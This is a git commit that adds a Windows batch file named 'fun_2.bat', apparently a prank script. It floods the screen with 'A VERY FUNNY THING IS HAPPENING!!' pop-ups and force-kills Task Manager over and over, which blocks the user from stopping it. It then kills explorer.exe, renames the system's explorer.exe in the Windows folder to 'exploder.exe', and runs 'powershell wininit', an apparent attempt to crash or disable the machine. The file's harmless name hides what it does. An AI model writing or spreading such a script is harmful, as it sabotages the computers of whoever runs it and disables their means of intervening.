263b6fe06235927910562ca997252ef36c2bb4c5
WavetecRR <105518107+Bluekoekj@users.noreply.github.com>
2022-10-07 21:16:33 +0100

    Add files via upload

---
+++ fun_2.bat
@@ -0,0 +1,56 @@
+msg * A VERY FUNNY THING IS HAPPENING!!
+cd files
+msg * A VERY FUNNY THING IS HAPPENING!!
+msg * A VERY FUNNY THING IS HAPPENING!!
+msg * A VERY FUNNY THING IS HAPPENING!!
+msg * A VERY FUNNY THING IS HAPPENING!!
+msg * A VERY FUNNY THING IS HAPPENING!!
+msg * A VERY FUNNY THING IS HAPPENING!!
+msg * A VERY FUNNY THING IS HAPPENING!!
+msg * A VERY FUNNY THING IS HAPPENING!!
+msg * A VERY FUNNY THING IS HAPPENING!!
+msg * A VERY FUNNY THING IS HAPPENING!!
+msg * A VERY FUNNY THING IS HAPPENING!!
+msg * A VERY FUNNY THING IS HAPPENING!!
+msg * A VERY FUNNY THING IS HAPPENING!!
+msg * A VERY FUNNY THING IS HAPPENING!!
+msg * A VERY FUNNY THING IS HAPPENING!!
+msg * A VERY FUNNY THING IS HAPPENING!!
+msg * A VERY FUNNY THING IS HAPPENING!!
+msg * A VERY FUNNY THING IS HAPPENING!!
+msg * A VERY FUNNY THING IS HAPPENING!!
+msg * A VERY FUNNY THING IS HAPPENING!!
+msg * A VERY FUNNY THING IS HAPPENING!!
+
+taskkill /im taskmgr.exe /f
+taskkill /im taskmgr.exe /f
+taskkill /im taskmgr.exe /f
+taskkill /im taskmgr.exe /f
+taskkill /im taskmgr.exe /f
+taskkill /im taskmgr.exe /f
+taskkill /im taskmgr.exe /f
+taskkill /im taskmgr.exe /f
+taskkill /im taskmgr.exe /f
+taskkill /im taskmgr.exe /f
+taskkill /im taskmgr.exe /f
+taskkill /im taskmgr.exe /f
+taskkill /im taskmgr.exe /f
+taskkill /im taskmgr.exe /f
+taskkill /im taskmgr.exe /f
+taskkill /im taskmgr.exe /f
+taskkill /im taskmgr.exe /f
+taskkill /im taskmgr.exe /f
+taskkill /im taskmgr.exe /f
+taskkill /im taskmgr.exe /f
+taskkill /im taskmgr.exe /f
+taskkill /im taskmgr.exe /f
+taskkill /im taskmgr.exe /f
+taskkill /im explorer.exe /f
+cd ..
+cd ..
+cd ..
+cd ..
+cd windows
+ren explorer.exe exploder.exe
+msg * Goodbye
+powershell wininit
